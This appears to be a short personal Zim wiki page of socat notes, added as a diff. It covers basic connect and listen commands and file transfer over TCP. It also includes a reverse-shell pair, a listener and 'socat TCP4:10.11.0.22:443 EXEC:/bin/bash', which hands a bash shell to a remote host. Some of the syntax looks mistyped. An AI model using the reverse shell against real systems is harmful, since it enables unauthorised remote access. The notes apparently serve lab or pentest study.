@@ -1,0 +1,28 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T12:22:08-04:00
+
+====== socat ======
+Created Tuesday 19 May 2020
+
+**socat -TCP4:{ip}:{port}**
+
+**sudo socat TCP$-LISTEN:{port} STDOUT**
+
+====== file transfering ======
+**--sudo socat TCP$-LISTEN:{port} ,fork file:{filename}**
+
+**--socat TCP4:{ip}:{port} file:receivedfilename,create**
+
+====== reverse shell ======
+**--socat -d -d TCP4-LISTEN:443 STDOUT**
+
+**--socat TCP4:10.11.0.22:443 EXEC:/bin/bash**
+
+
+====== binary run ======
+
+**socat -v tcp-l:1234,fork exec:'./arr'**
+can listen
+**nc localhost 1234**
+
